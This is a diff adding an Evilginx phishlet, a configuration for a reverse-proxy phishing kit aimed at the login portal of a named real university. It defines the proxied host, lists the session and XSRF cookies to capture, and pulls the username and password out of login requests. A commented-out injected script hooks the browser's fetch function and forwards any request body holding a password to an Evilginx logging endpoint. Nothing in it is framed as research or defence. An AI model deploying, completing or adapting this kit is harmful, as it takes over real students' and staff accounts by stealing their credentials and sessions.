@@ -1,0 +1,53 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'unilorin.edu.ng', session: true, is_landing: true, auto_filter: true}
+sub_filters:
+   - {triggers_on: 'portal.unilorin.edu.ng', orig_sub: 'portal', domain: 'unilorin.edu.ng', search: '""', replace: '""', mimes: ['application/json']}
+auth_tokens:
+  - domain: 'portal.unilorin.edu.ng'
+    keys: ['unilorin_portal_session', 'XSRF-TOKEN']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'json'
+    path: '/api/login'
+    method: 'POST'
+    headers:
+      Referer: 'https://portal.unilorin.edu.ng/api/login'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'json'
+    path: '/api/login'
+    method: 'POST'
+    headers:
+      Referer: 'https://portal.unilorin.edu.ng/api/login'
+login:
+  domain: 'portal.unilorin.edu.ng'
+  path: '/'
+#js_inject:
+ # - trigger_domains: ["portal.unilorin.edu.ng"]
+  #  trigger_paths: [""]
+   # trigger_params: [""]
+    #script:
+     # (function() {
+      #  var origFetch = window.fetch;
+       # window.fetch = function() {
+        #  try {
+         #   let args = arguments;
+          #  if (args.length > 1 && args[1].body) {
+           #   let body = args[1].body;
+            #  if (typeof body === "string" && body.includes("password")) {
+             #   // Send credentials to Evilginx sink
+              #  fetch("/evilginx-log", {
+               #   method: "POST",
+                #  headers: { "Content-Type": "application/json" },
+                 # body: JSON.stringify({ data: body })
+#                });
+#              }
+ #           }
+  #        } catch (e) {}
+   #       return origFetch.apply(this, arguments);
+    #    };
+     # })();
